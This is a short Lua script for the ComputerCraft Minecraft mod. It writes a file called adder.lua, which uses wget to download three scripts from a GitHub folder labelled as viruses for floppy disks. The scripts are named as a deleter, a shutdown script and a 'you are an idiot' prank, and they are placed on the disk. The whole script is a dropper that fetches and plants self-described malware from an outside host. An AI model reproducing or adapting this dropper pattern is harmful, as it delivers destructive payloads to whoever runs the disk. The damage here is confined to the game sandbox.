local VF = fs.open("adder.lua", "w")
local VS = [[
    shell.run("wget", "https://raw.githubusercontent.com/Fakedrift/CC-stuff-I-made/main/Virus's%20(go%20on%20floppy%20disks)/DELETER.LUA", "disk/DELETER.lua")
    shell.run("wget", "https://raw.githubusercontent.com/Fakedrift/CC-stuff-I-made/main/Virus's%20(go%20on%20floppy%20disks)/shuttydowny.lua", "disk/shuttydowny.lua")
    shell.run("wget", "https://raw.githubusercontent.com/Fakedrift/CC-stuff-I-made/main/Virus's%20(go%20on%20floppy%20disks)/you%20are%20an%20idiot.lua", "disk/YAAI.lua")
    term.clear()
]] 
VF.write(VS)
VF.close()
